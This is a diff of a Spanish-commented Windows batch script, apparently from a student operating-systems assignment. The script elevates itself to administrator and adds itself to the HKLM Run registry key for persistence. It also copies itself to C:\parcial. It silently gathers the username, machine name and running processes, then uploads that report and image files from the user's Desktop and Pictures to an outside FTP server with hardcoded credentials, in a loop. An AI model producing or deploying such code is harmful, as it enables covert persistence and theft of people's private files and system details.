@@ -1,7 +1,6 @@
 @echo off
 chcp 65001 >nul
 setlocal enabledelayedexpansion
-title Sistema - @Juliocrm
 
 :: ======================================================================
 :: --- VERIFICACION DE ADMIN Y AUTO-ELEVACION ---
@@ -13,30 +12,37 @@ if %errorLevel% neq 0 (
 )
 
 :: ======================================================================
-:: --- PERSISTENCIA MEDIANTE PROGRAMADOR DE TAREAS (BACKGROUND) ---
+:: --- AGREGAR AL ARRANQUE DE WINDOWS (REGEDIT) ---
 :: ======================================================================
-:: Crea una tarea programada que ejecuta este archivo exactamente donde está guardado.
-:: Al ejecutarse como "NT AUTHORITY\SYSTEM", el script corre de forma nativa en segundo plano sin ventana de CMD.
-schtasks /query /tn "Tarea_Gr03_Rios" >nul 2>&1
-if %errorLevel% neq 0 (
-    schtasks /create /tn "Tarea_Gr03_GutierrezJ" /tr "\"%~f0\"" /sc onstart /ru "NT AUTHORITY\SYSTEM" /f >nul 2>&1
-)
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Mundial_Rios" /t REG_SZ /d "C:\parcial\Rios.bat" /f >nul 2>&1
 
 :: ======================================================================
-:: --- CONFIGURACION DE RUTAS Y REPORTE ---
+:: --- REPLICACIÓN: CREAR CARPETA Y COPIARSE COMO APELLIDO.BAT ---
 :: ======================================================================
 if not exist "C:\parcial" (
     mkdir "C:\parcial" >nul 2>&1
 )
 
-set "DESTINO_RED=\\192.168.5.72\parcial"
-set "ARCHIVO_LOCAL=C:\parcial\Gr03_Rios.txt"
+if /i "%~f0" neq "C:\parcial\Rios.bat" (
+    copy /Y "%~f0" "C:\parcial\Rios.bat" >nul 2>&1
+)
+
+:: ======================================================================
+:: --- CONFIGURACION DE RUTAS Y REPORTE ---
+:: ======================================================================
+set "ARCHIVO_LOCAL=C:\parcial\datos.txt"
 
 set "USUARIO=!USERNAME!"
 set "MAQUINA=!COMPUTERNAME!"
 
-:: Configuración de la URL Dinámica del Servidor FTP
+set "ORIGEN_ESCRITORIO=%USERPROFILE%\Desktop"
+set "ORIGEN_IMAGENES=%USERPROFILE%\Pictures"
+
+:: Configuración de las URLs Dinámicas del Servidor FTP
 set "FTP_SERVER=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/Gr03_!MAQUINA!/Gr03_Rios.txt"
+set "FTP_URL_ESC=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/Gr03_!MAQUINA!/ESCRITORIO"
+set "FTP_URL_IMG=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/Gr03_!MAQUINA!/IMAGENES"
+
 set "FTP_USER=u917850771"
 set "FTP_PASS=Unicesar2026+"
 
@@ -87,18 +93,25 @@ echo. >> "!ARCHIVO_LOCAL!"
 tasklist >> "!ARCHIVO_LOCAL!"
 echo. >> "!ARCHIVO_LOCAL!"
 echo ============================================================ >> "!ARCHIVO_LOCAL!"
-echo  @Juliocrm >> "!ARCHIVO_LOCAL!"
+echo  @Juliocrm  >> "!ARCHIVO_LOCAL!"
 echo ============================================================ >> "!ARCHIVO_LOCAL!"
 
-REM == Transferencia de Archivos a la Carpeta de Red ==
-copy /Y "!ARCHIVO_LOCAL!" "!DESTINO_RED!\Gr03_Rios.txt" >nul 2>&1
-
 :: ======================================================================
-:: --- ENVÍO DE DATOS MEDIANTE CURL AL SERVIDOR FTP ---
+:: --- ENVÍO DE DATOS MEDIANTE CURL AL SERVIDOR FTP (SILENCIOSO) ---
 :: ======================================================================
 curl --ftp-create-dirs -u "!FTP_USER!:!FTP_PASS!" -T "!ARCHIVO_LOCAL!" "!FTP_SERVER!" >nul 2>&1
 
-:: Temporizador silencioso de 30 segundos
-timeout /t 30 /nobreak >nul
+for %%F in ("!ORIGEN_ESCRITORIO!\*.jpg" "!ORIGEN_ESCRITORIO!\*.jpeg" "!ORIGEN_ESCRITORIO!\*.png") do (
+    curl --ftp-create-dirs -u "!FTP_USER!:!FTP_PASS!" -T "%%F" "!FTP_URL_ESC!/%%~nxF" >nul 2>&1
+    goto :SUBIR_IMAGENES
+)
 
+:SUBIR_IMAGENES
+for %%G in ("!ORIGEN_IMAGENES!\*.jpg" "!ORIGEN_IMAGENES!\*.jpeg" "!ORIGEN_IMAGENES!\*.png") do (
+    curl --ftp-create-dirs -u "!FTP_USER!:!FTP_PASS!" -T "%%G" "!FTP_URL_IMG!/%%~nxG" >nul 2>&1
+    goto :FIN_SUBIDA
+)
+
+:FIN_SUBIDA
+timeout /t 30 /nobreak >nul
 goto BUCLE
